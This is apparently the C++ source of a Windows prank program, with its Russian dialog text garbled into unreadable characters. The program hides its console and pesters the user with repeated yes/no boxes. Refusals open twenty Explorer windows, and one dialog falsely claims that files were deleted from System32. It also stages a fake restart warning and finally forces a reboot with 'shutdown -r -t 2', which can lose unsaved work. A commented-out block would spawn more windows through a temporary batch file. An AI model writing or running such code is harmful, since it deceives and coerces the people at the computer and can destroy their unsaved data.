#include <stdio.h>
#include <conio.h>
#include <clocale>
#include <Windows.h>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	setlocale(LC_CTYPE, "rus");
	int n=0;
	while(n!=6)
	{
		n = MessageBox(NULL, L"������! � �����.���\n������� ������������.\n�� ��� ���?", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
		if(n==7) 
		{
			MessageBox(NULL, L"�����, ���� ����� �������� ���� ������ � ���...", L"�����.���", MB_OK | MB_ICONINFORMATION);
			for(int i=0; i<20; i++)
				system("start explorer");
			Sleep(5000);
		}
	}
	n = MessageBox(NULL, L"������ =)\n�������, �� ����� � ����� ����������.\n����� � ���� ���� �� ����� ����������?", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
	if(n==7)
	{
		n = MessageBox(NULL, L"������? � ���� ���� ���� ����� ��������� =)", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
		if(n==6)
		{
			MessageBox(NULL, L"��� ���������� XD", L"�����.���", MB_OK | MB_ICONINFORMATION);
			MessageBox(NULL, L"5 ������ ���� ������� � C:\\Wind�ws\\Syst�m32", L"�����.���", MB_OK | MB_ICONWARNING);
			n = MessageBox(NULL, L"������ ��������� ��� ���� �� ����� ����������?", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
			if (n==7) 
			{
				MessageBox(NULL, L"����� � ������� ���� ���������.", L"�����.���", MB_OK | MB_ICONINFORMATION);
				system("shutdown -r -t 100 -c \"��� ��������� �������������� ����� 100 ������. ����������, ��������� ������ ���� ������� � ��������� ������������.\"");
				Sleep(20000);
				system("shutdown -a");
				n = MessageBox(NULL, L"������? � ������. ��� �� ��������� ��� ���� �� ����� ����������?", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
				if(n==7) 
				{
					MessageBox(NULL, L"�� � ������ � ����������.", L"�����.���", MB_OK | MB_ICONINFORMATION);
					system("shutdown -r -t 2");
					return 0;
				}
			}
		}
	}
	//taskkill /F /IM explorer.exe
	//start explorer.exe
	MessageBox(NULL, L"�����! =)\n����������� ��� ������� ���������)", L"�����.���", MB_OK | MB_ICONINFORMATION);
	n = MessageBox(NULL, L"������ ������� ���� ����������?", L"�����.���", MB_YESNO | MB_ICONINFORMATION);
	if(n==6) system("start https://www.youtube.com/watch?v=PK2dpARDwm8");
	Sleep(10000);
	/*FILE *p;
	p=fopen("C:\\dat.txt","w");
	fputs("@echo off\nstart explorer\nstart explorer\nstart explorer\nstart explorer\nstart explorer\nexit", p);
	fclose(p);
	system("ren C:\\dat.txt dat.bat");
	system("start C:\\dat.bat");
	Sleep(50);
	system("del C:\\dat.bat");
	//  */
	return 0;
}